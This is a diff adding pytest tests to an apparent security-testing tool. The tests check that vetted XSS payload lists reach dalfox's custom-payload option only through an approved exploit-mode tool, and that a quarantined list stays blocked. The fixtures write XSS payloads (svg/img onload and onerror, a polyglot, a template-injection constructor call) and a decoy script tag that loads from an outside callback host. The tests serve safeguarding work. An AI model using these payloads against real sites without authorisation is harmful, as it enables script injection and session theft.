@@ -9,6 +9,7 @@ them.
 from __future__ import annotations
 
 import json
+from pathlib import Path
 
 import pytest
 
@@ -159,6 +160,211 @@ class TestCatalogTool:
         assert result["ok"] is False
         assert result["error"] == "store_not_built"
         assert "vet_payloads.py --fetch" in result["message"]
+
+
+class TestTierBReachability:
+    """Tier B has to be reachable from the tool that owns it, and nowhere else.
+
+    The store grew a tier B opt-in and, for a while, nothing in the server passed
+    it: the lists were fetched, vetted, and unreachable, while the docs described
+    an approval gate that had no caller. ``xss_validate`` is that caller — it
+    hands a vetted injection list to dalfox's ``--custom-payload``. These tests
+    pin both halves: the list arrives, and tier C still cannot.
+    """
+
+    TIER_B_MANIFEST = {
+        "files": [
+            {"name": "xsspollygots.txt", "tier": "B", "kind": "injection", "lines": 3,
+             "sha256": "x", "get_only": False, "reasons": []},
+            {"name": "xsswafbypss.txt", "tier": "B", "kind": "injection", "lines": 2,
+             "sha256": "x", "get_only": False, "reasons": []},
+            {"name": "vulJs.txt", "tier": "B", "kind": "injection", "lines": 1,
+             "sha256": "x", "get_only": False, "reasons": []},
+            {"name": "xss.txt", "tier": "C", "kind": "injection", "lines": 5,
+             "sha256": "x", "get_only": False,
+             "reasons": ["callback to GH0ST.xss.ht"]},
+        ]
+    }
+
+    @pytest.fixture
+    def tier_b_store(self, engagement, tmp_path):
+        """A store holding the real tier B filenames, plus a tier C decoy."""
+        root = tmp_path / "payload-store"
+        root.mkdir()
+        (root / "manifest.json").write_text(json.dumps(self.TIER_B_MANIFEST))
+        (root / "B").mkdir()
+        (root / "B" / "xsspollygots.txt").write_text(
+            "<svg/onload=alert(1)>\n\njaVasCript:/*-/*`/**/(oNcliCk=alert())//\n<img src=x onerror=alert(1)>\n"
+        )
+        (root / "B" / "xsswafbypss.txt").write_text("<Svg Only=1 OnLoad=confirm(1)>\n")
+        (root / "B" / "vulJs.txt").write_text("{{constructor.constructor('alert(1)')()}}\n")
+        (root / "_quarantine").mkdir()
+        (root / "_quarantine" / "xss.txt").write_text("<script src=//gh0st.xss.ht></script>\n")
+        engagement.config.data["payloads"] = {"store": str(root), "lists": {}}
+        return root
+
+    @pytest.fixture
+    def captured_dalfox(self, monkeypatch):
+        """Stand in for dalfox and record the argv it would have been given."""
+        from easyhunt.tools import exploitation as ex
+        from easyhunt.tools.common import ToolRun
+
+        calls: list[list[str]] = []
+
+        async def fake_run_one(name, argv, **kwargs):
+            calls.append(argv)
+            return ToolRun(tool=name, ran=True, values=[], exit_code=0)
+
+        monkeypatch.setattr(ex, "run_one", fake_run_one)
+        return calls
+
+    def _approve(self, engagement) -> None:
+        from easyhunt.control_plane.approval import PolicyBackend
+
+        engagement.approval.backend = PolicyBackend(auto_approve=["xss_validate"])
+
+    async def test_named_list_reaches_dalfox(
+        self, engagement, tier_b_store, captured_dalfox
+    ) -> None:
+        self._approve(engagement)
+        result = await REGISTRY["xss_validate"].fn(
+            target="https://www.example.com/?q=1", payload_list="xss-polyglots"
+        )
+
+        assert result["ok"] is True
+        assert result["payload_list"]["tier"] == "B"
+        argv = captured_dalfox[0]
+        assert "--custom-payload" in argv
+        # The real run_one sanitizes this argv before executing it, so a flag on
+        # the allowlist that a policy rejects in practice would still be dead.
+        from easyhunt.control_plane.sanitize import sanitize_argv
+        from easyhunt.tools import exploitation as ex
+
+        sanitize_argv("dalfox", argv, policy=ex.DALFOX.arg_policy)
+        staged = Path(argv[argv.index("--custom-payload") + 1])
+        # Staged inside the workspace: the store sits outside it, and only
+        # workspace paths are mounted into the sandbox.
+        assert staged.is_relative_to(engagement.workspace)
+        # Copied, not rewritten — blank lines dropped, payload text untouched.
+        assert staged.read_text().splitlines() == [
+            "<svg/onload=alert(1)>",
+            "jaVasCript:/*-/*`/**/(oNcliCk=alert())//",
+            "<img src=x onerror=alert(1)>",
+        ]
+        # The vetted store itself stays read-only.
+        assert (tier_b_store / "B" / "xsspollygots.txt").read_text().startswith("<svg/onload")
+
+    async def test_every_shipped_name_resolves(
+        self, engagement, tier_b_store, captured_dalfox
+    ) -> None:
+        from easyhunt.tools import exploitation as ex
+
+        self._approve(engagement)
+        for name in ex.XSS_PAYLOAD_LISTS:
+            result = await REGISTRY["xss_validate"].fn(
+                target="https://www.example.com/?q=1", payload_list=name
+            )
+            assert result["ok"] is True, f"{name}: {result.get('message')}"
+            assert result["payload_list"]["tier"] == "B"
+
+    async def test_no_list_means_no_custom_payload_flag(
+        self, engagement, tier_b_store, captured_dalfox
+    ) -> None:
+        # The default run is unchanged: dalfox's own context-aware payloads.
+        self._approve(engagement)
+        result = await REGISTRY["xss_validate"].fn(target="https://www.example.com/?q=1")
+        assert "payload_list" not in result
+        assert "--custom-payload" not in captured_dalfox[0]
+
+    async def test_tier_c_is_still_unreachable_from_the_tool(
+        self, engagement, tier_b_store, captured_dalfox, monkeypatch
+    ) -> None:
+        # The manifest's own tool_map names xss.txt for xss_validate, and xss.txt
+        # is quarantined for a GH0ST.xss.ht callback. Even an alias table that
+        # asks for it by name is refused at resolution, and nothing is run.
+        from easyhunt.tools import exploitation as ex
+
+        monkeypatch.setitem(
+            ex.XSS_PAYLOAD_LISTS, "xss-quarantined", {"file": "xss.txt", "tools": ["dalfox"]}
+        )
+        self._approve(engagement)
+        result = await REGISTRY["xss_validate"].fn(
+            target="https://www.example.com/?q=1", payload_list="xss-quarantined"
+        )
+        assert result["ok"] is False
+        assert result["error"] == "payload_list_unavailable"
+        assert "QUARANTINED" in result["message"]
+        assert captured_dalfox == []
+
+    async def test_unknown_list_reports_the_names_that_exist(
+        self, engagement, tier_b_store, captured_dalfox
+    ) -> None:
+        from easyhunt.tools import exploitation as ex
+
+        self._approve(engagement)
+        result = await REGISTRY["xss_validate"].fn(
+            target="https://www.example.com/?q=1", payload_list="no-such-list"
+        )
+        assert result["ok"] is False
+        assert result["available"] == sorted(ex.XSS_PAYLOAD_LISTS)
+        # No silent fallback to dalfox's defaults: that would run a different
+        # test from the one the operator approved.
+        assert captured_dalfox == []
+
+    async def test_oversized_list_is_refused_not_truncated(
+        self, engagement, tier_b_store, captured_dalfox
+    ) -> None:
+        from easyhunt.tools import exploitation as ex
+
+        (tier_b_store / "B" / "vulJs.txt").write_text(
+            "\n".join(f"<img src=x onerror=alert({i})>" for i in range(ex.MAX_CUSTOM_PAYLOADS + 1))
+        )
+        self._approve(engagement)
+        result = await REGISTRY["xss_validate"].fn(
+            target="https://www.example.com/?q=1", payload_list="xss-js-frameworks"
+        )
+        assert result["ok"] is False
+        assert "over the ceiling" in result["message"]
+        assert captured_dalfox == []
+
+    async def test_the_tool_still_needs_approval(self, engagement, tier_b_store) -> None:
+        from easyhunt.errors import ApprovalDenied
+
+        # Tier B rides the existing gate on an exploit-mode tool; it does not add
+        # a second one, and it must not have opened a path around the first.
+        assert REGISTRY["xss_validate"].mode == "exploit"
+        with pytest.raises(ApprovalDenied):
+            await REGISTRY["xss_validate"].fn(
+                target="https://www.example.com/?q=1", payload_list="xss-polyglots"
+            )
+
+    def test_content_discovery_cannot_name_an_injection_list(self, store: PayloadStore) -> None:
+        # Two independent reasons, both worth pinning: the tier B names are not
+        # in config.yaml's alias namespace at all, and even a store that knows
+        # the name refuses it without the caller opt-in.
+        from easyhunt.tools import exploitation as ex
+
+        configured = store_from_config(Config.load())
+        for name in ex.XSS_PAYLOAD_LISTS:
+            assert name not in {item["name"] for item in configured.catalog()}
+        with pytest.raises(PayloadError, match="not a discovery wordlist"):
+            store.resolve("inject")
+
+    def test_shipped_names_are_tier_b_in_the_real_manifest(self) -> None:
+        # The alias table lives in code; the tier lives in the manifest. If a
+        # file is ever reclassified, or renamed upstream, this fails here rather
+        # than at the moment someone tries to validate a finding with it.
+        from easyhunt.tools import exploitation as ex
+
+        configured = store_from_config(Config.load())
+        if not configured.available:
+            pytest.skip("payload store not built on this machine")
+        store = PayloadStore(configured.root, ex.XSS_PAYLOAD_LISTS)
+        for name in ex.XSS_PAYLOAD_LISTS:
+            entry = store.resolve(name, allow_tier_b=True)
+            assert entry.tier == "B"
+            assert entry.path.is_file()
+            assert entry.lines <= ex.MAX_CUSTOM_PAYLOADS
 
 
 class TestJobStatus:
